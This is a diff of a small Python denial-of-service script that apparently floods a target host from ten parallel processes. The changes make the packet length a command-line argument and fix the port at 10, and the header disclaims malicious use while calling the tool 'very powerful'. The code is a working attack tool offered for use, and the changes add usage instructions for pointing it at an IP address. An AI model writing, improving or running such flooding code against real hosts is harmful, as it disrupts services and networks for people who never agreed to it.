@@ -1,6 +1,6 @@
 # Written by MsonC
 # Please DO NOT use this script for any malicious uses!
-# as I am not responsible for your actions.
+# If you do I am not responsible for your actions
 #
 # You download it! you take responsiblibity for it!
 # As I have stated this script is very powerful. However, That was on my internet and bandwidth
@@ -9,23 +9,22 @@
 # Thanks
 # Happy Coding, Hacking, and Testing
 
-
-
 import socket
 import sys
 from multiprocessing import Process
 
-#python boot.py host port
-#Hit ctrl + C to stop
+# How to run the program - python p0ke.py   host   stringlen
+#                          python p0ke.py 192.168.1.1 60000
+# Hit ctrl + C to stop
 
 host = sys.argv[1]
-# port = sys.argv[2] # uncomment this line and comment out the line below if you would like to type in your own custom port for the tool
-# other wise leave it the same
-port = 20
+b = sys.argv[2]
+port = 10
+
+
 
 mkstring = lambda(x): "".join(map(chr, (ord('a')+(y%26) for y in range(x))))
-packet = mkstring(8000) # 8000 is the string length. DO NOT TOUCH THIS UNLESS YOU KNOW WHAT YOU DOING! THIS IS THE BEST NUMBER THAT I HAVE FOUND SO FAR! you can make it smaller
-# for a smaller attack but not much larger
+packet = mkstring(int(b))
 
 def dos(host, port):
 
@@ -42,7 +41,7 @@ if __name__ == '__main__':
     # origin_time = time.time()
 
     processes = list()
-    for i in range(0, 10):
+    for i in range(0, 10): # Make sure to change the number 10 to a lower number if you are useing too much CPU
         process = Process(target=dos, args=(host, port)) # Allocate the processes to the above code
         process.start() # Start the processes
         processes.append(process) # Add the proccesses to the list
